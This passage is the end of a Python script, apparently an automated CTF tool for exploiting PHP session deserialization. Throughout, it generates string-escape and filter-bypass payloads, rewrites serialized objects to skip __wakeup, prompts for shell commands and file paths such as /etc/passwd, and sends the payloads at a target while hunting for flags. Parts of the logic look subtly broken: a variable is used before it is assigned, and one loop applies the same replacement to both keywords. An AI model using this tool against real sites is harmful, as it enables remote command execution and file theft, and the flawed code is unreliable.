        escape_payloads = session_escape.get('payloads', [])
        if escape_payloads:
            print(f"[*] 生成绕过Payload数量: {len(escape_payloads)}")

            two_stage_payloads = tool.session_escape_detector.generate_two_stage_payloads() if tool.session_escape_detector else []

            if two_stage_payloads:
                print(f"[*] 检测到可能的两阶段文件读取，开始自动利用...")

                for two_stage in two_stage_payloads:
                    stage1 = two_stage['stage1']
                    stage2 = two_stage['stage2']

                    print(f"\n[*] {stage1['description']}")
                    result1 = tool.exploit_session_escape(args.target, [stage1])

                    if result1.get('has_hint') and result1.get('hint_value'):
                        hint_file = result1['hint_value']
                        print(f"\n[!] 获取到提示文件: {hint_file}")
                        print(f"[*] 正在读取真正flag...")

                        encoded_hint = base64.b64encode(hint_file.encode()).decode()
                        hint_escaped = '";s:3:"img";s:' + str(len(encoded_hint)) + ':"' + encoded_hint + '";s:1:"1";s:1:"2";}'
                        stage2_payload = {
                            'POST': {
                                '_SESSION[user]': 'flagflagflagflagflagphp',
                                '_SESSION[function]': hint_escaped
                            },
                            'GET': {'f': 'show_image'},
                            'method': 'session_string_escape',
                            'target_file': hint_file,
                            'description': f'第二阶段:读取{hint_file}'
                        }

                        result2 = tool.exploit_session_escape(args.target, [stage2_payload])

                        if result2.get('has_flag'):
                            print(f"\n\n{'='*70}")
                            print(f"  [!!!] 发现FLAG!")
                            print(f"{'='*70}")
                            print(f"\n[!!!] FLAG: {result2['flag_value']}")
                            found_flag = True
                            break

            if not found_flag:
                print(f"\n[*] 开始普通Session字符串逃逸利用...")
                for payload_info in escape_payloads[:20]:
                    if found_flag:
                        break

                    result = tool.exploit_session_escape(args.target, [payload_info])

                    if result.get('has_flag'):
                        print(f"\n\n{'='*70}")
                        print(f"  [!!!] 发现FLAG!")
                        print(f"{'='*70}")
                        print(f"\n[!!!] FLAG: {result['flag_value']}")
                        found_flag = True
                        break

                    if result.get('has_hint'):
                        print(f"\n[!] 获取到提示: {result.get('hint_value')}")

        if found_flag:
            return

    if bypass_mode:
        print(f"\n[!] 漏洞类型: FILTER_BYPASS (过滤器绕过)")
        print(f"[*] 生成绕过Payload用于Session反序列化")

        if HAS_PATTERN_DETECTOR and raw_code:
            detector = PatternDetector(raw_code)
            patterns = detector.detect_all()
            for pattern in patterns:
                if pattern.vuln_type.value == 'filter_bypass':
                    filters = pattern.details.get('filters', [])
                    from filter_bypass import FilterBypassPayloadGenerator, SessionSerializeExploiter
                    filter_bypass_gen = FilterBypassPayloadGenerator(filters)
                    break

        files_to_try = ['show_image', 'highlight_file', 'phpinfo', 'fl3g', 'fl4g']
        cmds_to_try = [None]
        if not args.file_read:
            files_to_try = [f for f in common_files if f != '/etc/passwd']
        else:
            files_to_try = [args.file_read]
    elif args.param:
        params_to_try = [args.param]
    else:
        params_to_try = common_params
    
    if has_rce:
        print(f"\n[!] 漏洞类型: RCE (远程命令执行)")
        if not args.cmd:
            user_cmd = input("[?] 输入要执行的命令 (直接回车尝试常见命令): ").strip()
            cmds_to_try = [user_cmd] if user_cmd else common_cmds
        else:
            cmds_to_try = [args.cmd]
        files_to_try = [None]
    elif has_file_read:
        print(f"\n[!] 漏洞类型: FILE_READ (文件读取)")
        if not args.file_read:
            user_file = input("[?] 输入要读取的文件路径 (直接回车尝试常见位置): ").strip()
            files_to_try = [user_file] if user_file else common_files
        else:
            files_to_try = [args.file_read]
        cmds_to_try = [None]
    else:
        if not args.cmd:
            user_cmd = input("[?] 输入要执行的命令 (直接回车跳过): ").strip()
            cmds_to_try = [user_cmd] if user_cmd else ['id']
        else:
            cmds_to_try = [args.cmd]
        if not args.file_read:
            user_file = input("[?] 输入要读取的文件路径 (直接回车跳过): ").strip()
            files_to_try = [user_file] if user_file else ['/flag']
        else:
            files_to_try = [args.file_read]
    
    if args.code:
        cmds_to_try = [None]
        files_to_try = [None]
    
    print(f"\n[*] 尝试参数: {', '.join(params_to_try)}")
    print(f"[*] 请求方法: {args.method}")
    if has_wakeup_entry:
        print("[*] 自动绕过__wakeup")

    all_results = []
    found_flag = False

    import re

    for file_path in files_to_try:
        if found_flag:
            break
        for cmd in cmds_to_try:
            if found_flag:
                break

            if bypass_mode and filter_bypass_gen:
                payloads = []
                bypass_all = filter_bypass_gen.generate_all_payloads()

                base_serial = 'a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:18:"Z3Vlc3RfaW1nLnBuZw==";}'

                for func_val in files_to_try:
                    for byp in bypass_all[:5]:
                        test_serial = base_serial.replace('show_image', func_val)
                        new_serial = byp['payload'].replace(
                            'show_image',
                            func_val
                        ) if 'show_image' in byp['payload'] else test_serial

                        if new_serial != base_serial:
                            payloads.append({
                                'payload': new_serial,
                                'type': 'filter_bypass',
                                'class': 'Session',
                                'chain': {}
                            })
                        else:
                            final_serial = base_serial.replace(by_dict.get('keyword', 'flag'),
                                by_dict.get('bypass', 'fl3g')) if 'keyword' in by_dict else base_serial
                            for kw, bp in [('flag', 'fl3g'), ('php', 'pphphp')]:
                                final_serial = final_serial.replace(kw, bp)
                            payloads.append({
                                'payload': final_serial,
                                'type': 'filter_bypass',
                                'class': 'Session',
                                'chain': {}
                            })

                by_dict = {}
                for byp in bypass_all[:3]:
                    if 'keyword' in byp:
                        by_dict = byp
                        break

                for func_val in ['show_image', 'highlight_file', 'phpinfo']:
                    for kw, bp in [('flag', 'fl3g'), ('php', 'pphphp')]:
                        test_payload = base_serial.replace('show_image', func_val)
                        test_payload = test_payload.replace('flag', bp)
                        test_payload = test_payload.replace('php', bp)
                        payloads.append({
                            'payload': test_payload,
                            'type': 'filter_bypass',
                            'class': 'Session',
                            'chain': {}
                        })
            else:
                payloads = tool.auto_generate_payloads(cmd or "id", file_path or "/flag")

            if args.code:
                for p in payloads:
                    p['payload'] = tool._inject_custom_code(p['payload'], args.code)

            if has_wakeup_entry:
                for p in payloads:
                    p['payload'] = re.sub(r'(O:\d+:"[^"]+":)(\d+)',
                                         lambda m: f"{m.group(1)}999", p['payload'])

            for param_name in params_to_try:
                if found_flag:
                    break

                print(f"\r[*] 尝试: 参数={param_name}, 文件={file_path}, 命令={cmd}    ", end="", flush=True)

                results = tool.auto_exploit(args.target, payloads, param_name, args.method)

                for r in results:
                    all_results.append(r)

                    if r.get('has_flag') and r.get('flag_value'):
                        found_flag = True
                        print(f"\n\n{'='*70}")
                        print(f"  [!!!] 发现FLAG!")
                        print(f"{'='*70}")
                        print(f"\n[参数]: {param_name}")
                        if file_path:
                            print(f"[文件]: {file_path}")
                        if cmd:
                            print(f"[命令]: {cmd}")
                        print(f"[Payload]: {r['payload']}")
                        print(f"\n[!!!] FLAG: {r['flag_value']}")
                        break

                    if r.get('success') and r.get('quality_score', 0) > 0.5 and not r.get('is_fake_success'):
                        clean_response = r.get('clean_response', '')
                        if len(clean_response) > 50 and 'class' not in clean_response.lower()[:200]:
                            print(f"\n\n{'='*70}")
                            print(f"  [+] 成功获取有价值的响应!")
                            print(f"{'='*70}")
                            print(f"\n[参数]: {param_name}")
                            if file_path:
                                print(f"[文件]: {file_path}")
                            print(f"[Payload]: {r['payload']}")
                            print(f"[质量评分]: {r.get('quality_score', 0):.2f}")
                            print(f"\n[响应]: {clean_response[:500]}")
                            break

                if found_flag:
                    break

    print()

    if not found_flag and all_results:
        print(f"\n{'='*70}")
        print("  利用结果")
        print(f"{'='*70}")

        success_count = sum(1 for r in all_results if r.get('success'))
        flag_count = sum(1 for r in all_results if r.get('has_flag'))
        quality_sum = sum(r.get('quality_score', 0) for r in all_results)
        print(f"\n[*] 总计: {len(all_results)} 次尝试")
        print(f"[*] 成功: {success_count} 次")
        print(f"[*] 发现Flag: {flag_count} 次")
        print(f"[*] 平均内容质量: {quality_sum / len(all_results):.2f}")

        high_quality_results = [r for r in all_results if r.get('quality_score', 0) > 0.3]
        if high_quality_results:
            print(f"\n[*] 高质量响应 ({len(high_quality_results)}个):")
            for r in high_quality_results[:5]:
                print(f"    - 质量:{r.get('quality_score', 0):.2f} 长度:{len(r.get('response', ''))} fake:{r.get('is_fake_success', False)}")

        best_result = max(all_results, key=lambda r: r.get('quality_score', 0)) if all_results else None
        if best_result and best_result.get('quality_score', 0) > 0.1 and not best_result.get('is_fake_success'):
            print(f"\n[+] 最佳Payload: {best_result['payload'][:80]}...")
            print(f"[+] 响应质量: {best_result.get('quality_score', 0):.2f}")

    if not all_results:
        print("\n[-] 利用失败，请检查目标URL")


if __name__ == '__main__':
    main()
